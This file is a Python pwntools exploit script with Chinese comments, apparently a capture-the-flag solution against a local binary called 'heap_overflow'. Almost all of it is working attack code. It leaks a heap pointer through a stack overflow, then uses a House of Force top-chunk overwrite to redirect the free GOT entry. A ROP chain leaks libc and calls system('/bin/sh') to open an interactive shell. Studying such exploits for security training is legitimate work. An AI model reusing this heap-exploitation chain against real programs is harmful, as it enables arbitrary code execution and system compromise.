#!/usr/bin/env python2
# -*- coding: UTF-8 -*-
# by chengsi

from pwn import *
import struct

# context.log_level = "debug"

p = process("./heap_overflow")
# p = remote("127.0.0.1",2333)

# ROP配件地址
POPRSP = 0x400986
ROPgadget = 0x40091e
# 相关地址，由libc确定
free_plt = 0x4005b0 
free_got = 0x601018
puts_plt = 0x4005d0
gets_plt = 0x400610
gets_got = 0x601048
gets_offset = 0x6ed80
system_offset = 0x45390
# /bin/sh写入地址
writeable = 0x601060
bs = "/bin/sh"
# name stack的实际长度 
name_length = 200
# 用于改写top chunk size的输入
string = "A"*264 + "\xff"*8


# 获得gets地址
payload = p64(ROPgadget)
payload += p64(gets_got)
payload += p64(0x1)
payload += p64(0x1)
payload += p64(puts_plt)

# 将system地址写入free_got
payload += p64(ROPgadget)
payload += p64(free_got)
payload += p64(0x1)
payload += p64(0x1)
payload += p64(gets_plt)

# 读入/bin/sh字符串
payload += p64(ROPgadget)
payload += p64(writeable)
payload += p64(0x1)
payload += p64(0x1)
payload += p64(gets_plt)

# 跳转到system执行
payload += p64(ROPgadget)
payload += p64(writeable)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(free_plt)

# 通过栈溢出读出p0地址
p.recvuntil('name:\n')
p.sendline("\xff"*(name_length+8))	

# 将参数压栈
p.recvuntil('log:\n')
p.sendline(payload)	

# 通过堆溢出改写top chunk 地址
p.recvuntil('string:\n')
p.clean()
p.sendline(string)


# 获得p0地址
p0_addrtmp = p.recv()[name_length+14:]

# 格式化，将ascill转成16进制
p0_addrtmp = p0_addrtmp[0:p0_addrtmp.index('\n'):] + "\x00\x00\x00\x00\x00"
p0_addr = struct.unpack('<Q',p0_addrtmp[:8:])

# 计算top chunk地址
ptr_top = p0_addr[0] + 0x100

print "top chunk address is:",hex(ptr_top)

# 计算目的地址到top top chunk距离(需要减去头)
evil_size = free_got - 0x10 - ptr_top - 0x10
# 求补码，因为以ascill码发送
evil_size = hex(((abs(evil_size) ^ 0xffffffffffffffff) + 1) & 0xffffffffffffffff)

print "evil_size is:", evil_size
# 发送需要分配的堆大小
p.sendline(evil_size)

# 第一次返回的heap是原top chunk缓冲区
p.recvuntil('string:\n')
p.clean()
p.sendline("no_thing_here")

# 第三个堆大小，大于0即可，由此返回第三个堆地址
p.recvuntil('heap:\n')
p.clean()
p.sendline("0x100")

# 第二次返回的写入地址，此时的是target地址(由于堆分配时有对齐，所以可能是target - 0x8)
p.recvuntil('string:\n')
p.clean()
# 由于对齐，多发送8字节，覆盖free_got，劫持控制流
p.sendline("\xff"*8 + p64(POPRSP))

# 得到gets地址，转换成ul
getsAddrTmp = p.recv()[0:6:] + "\x00\x00\x00\x00\x00"
getsAddr = struct.unpack('<Q',getsAddrTmp[:8:])[0]
print "getsaddr is ", hex(getsAddr)

# 由偏移地址得到system在内存中的地址 
systemAddr = hex(getsAddr - gets_offset + system_offset)

print "systemAddr is", systemAddr
# 发送system地址到free_got
p.sendline(p64(int(systemAddr,16)))
# 发送/bin/sh 字符串到可写入地址
p.sendline(bs)

# done！
p.interactive()
